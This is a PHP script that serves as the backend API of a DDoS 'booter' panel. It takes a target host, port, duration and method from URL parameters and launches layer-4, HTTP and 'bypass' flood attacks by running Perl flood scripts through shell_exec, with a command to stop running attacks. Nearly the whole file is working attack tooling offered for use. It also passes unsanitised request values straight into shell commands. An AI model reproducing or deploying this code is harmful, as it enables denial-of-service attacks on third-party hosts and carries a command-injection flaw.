<html><head><title>API</title></head><meta charset="UTF-8"></html>
<?php
error_reporting(0);
$host = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];
$method = $_GET['method'];
switch($method) {
    ////L4
    case 'UDP': $output = shell_exec("screen -dmS $host perl a83f1ca5ad00b39773d9e6a26b0e70b2/UDP.pl $host $port a83f1ca5ad00b39773d9e6a26b0e70b2/1Mio.dat $time"); die("attack sent to $host per $time seconds."); break;
    case 'STD': $output = shell_exec("screen -dmS $host ./a83f1ca5ad00b39773d9e6a26b0e70b2/STD $host $port $time"); die("attack sent to $host per $time seconds."); break;
    case 'DNS': $output = shell_exec("screen -dmS $host perl a83f1ca5ad00b39773d9e6a26b0e70b2/DNS.pl $host $time"); die("attack sent to $host per $time seconds."); break;   
    case 'RND': $output = shell_exec("screen -dmS $host perl a83f1ca5ad00b39773d9e6a26b0e70b2/RND.pl $host $time"); die("attack sent to $host per $time seconds."); break;    
    ////L7
    case 'GHP': $output = shell_exec("screen -dmS $host perl a83f1ca5ad00b39773d9e6a26b0e70b2/HTTP.pl http://$host/ 1000 100 GHP 177.25 $time"); die("attack sent to $host per $time seconds."); break;
    case 'PPS': $output = shell_exec("screen -dmS $host perl a83f1ca5ad00b39773d9e6a26b0e70b2/HTTP.pl http://$host/ 1000 100 PPS 177.25 $time"); die("attack sent to $host per $time seconds."); break;  
    ////BP
    case 'WALKER': $output = shell_exec("screen -dmS $host perl a83f1ca5ad00b39773d9e6a26b0e70b2/Walker.pl $host $time"); die("attack sent to $host per $time seconds."); break; 
    case 'CISCO': $output = shell_exec("screen -dmS $host perl a83f1ca5ad00b39773d9e6a26b0e70b2/Cisco.pl $host $time"); die("attack sent to $host per $time seconds."); break;   
    case 'NULLROUTER': $output = shell_exec("screen -dmS $host perl a83f1ca5ad00b39773d9e6a26b0e70b2/NULL.pl $host $time"); die("attack sent to $host per $time seconds."); break;   
    case 'VOXILITY': $output = shell_exec("screen -dmS $host perl a83f1ca5ad00b39773d9e6a26b0e70b2/VOX.pl $host $time"); die("attack sent to $host per $time seconds."); break;   
  
    case 'STOP': $output = shell_exec("screen -X -s $host quit"); die("The attacks that were running on the host $host were finalized!"); break;
    default: die('Wrong method !'); 
}
?>